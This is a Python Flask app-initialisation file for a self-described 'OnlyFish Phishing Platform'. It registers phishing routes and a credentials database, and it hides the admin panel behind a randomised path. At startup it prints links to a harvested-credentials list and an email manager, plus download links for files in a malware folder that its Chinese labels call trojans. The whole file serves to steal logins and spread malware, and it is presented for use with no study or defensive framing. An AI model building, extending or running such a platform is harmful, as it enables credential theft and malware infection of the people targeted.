from flask import Flask
from .config import Config
from .models.creds_model import db


import random
import string

def random_admin_path(length=8):
    return '/admin_' + ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_app():
    app = Flask(__name__)
    app.config.from_object(Config)
    db.init_app(app)

    # 自动初始化数据库表结构（兼容 Flask 3.x）
    with app.app_context():
        db.create_all()
    # 注册蓝图
    from .routes.fake_routes import phish_bp
    from .routes import admin_routes
    admin_path = random_admin_path()
    app.register_blueprint(phish_bp)
    app.register_blueprint(admin_routes.create_admin_bp(admin_path))
    app.config['ADMIN_PATH'] = admin_path

    # 启动后仅打印后台管理和邮件管理页面，隐藏钓鱼页面
    import socket
    import os
    import sys
    try:
        host_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        host_ip = '127.0.0.1'
    port = 5000
    for i, arg in enumerate(sys.argv):
        if arg in ('--port', '-p') and i+1 < len(sys.argv):
            try:
                port = int(sys.argv[i+1])
            except Exception:
                pass
    base_urls = [f"http://127.0.0.1:{port}", f"http://{host_ip}:{port}"]
    # 彩色渐变粉色 OnlyFish ASCII 艺术字
    pinks = [
        '\033[38;2;255;182;193m', # lightpink
        '\033[38;2;255;105;180m', # hotpink
        '\033[38;2;255;20;147m',  # deeppink
        '\033[38;2;255;128;192m', # orchid
        '\033[38;2;255;160;203m', # pink
        '\033[38;2;255;110;180m', # custom
    ]
    logo_lines = [
        "         ___        _         _____ _     _     ",
        "        / _ \ _ __ | |_   _  |  ___(_)___| |__  ",
        "       | | | | '_ \| | | | | | |_  | / __| '_ \ ",
        "       | |_| | | | | | |_| | |  _| | \__ \ | | |",
        "        \___/|_| |_|_|\__, | |_|   |_|___/_| |_| ",
        "                      |___/                     ",
        "            OnlyFish Phishing Platform"
    ]
    for i, line in enumerate(logo_lines):
        color = pinks[i % len(pinks)]
        print(f"{color}{line}\033[0m")
    print("\n[INFO] 后台管理页面入口：")
    for base in base_urls:
        print(f"后台凭证列表:    {base}{admin_path}/creds")
        print(f"邮件管理页面:    {base}{admin_path}/email_manager")
    # 输出木马下载链接（如有）
    malware_dir = os.path.join(app.root_path, '../malware')
    if os.path.exists(malware_dir):
        malware_files = [f for f in os.listdir(malware_dir) if os.path.isfile(os.path.join(malware_dir, f))]
        for base in base_urls:
            for f in malware_files:
                print(f"木马下载链接:    {base}/malware/{f}")
    print()
    return app
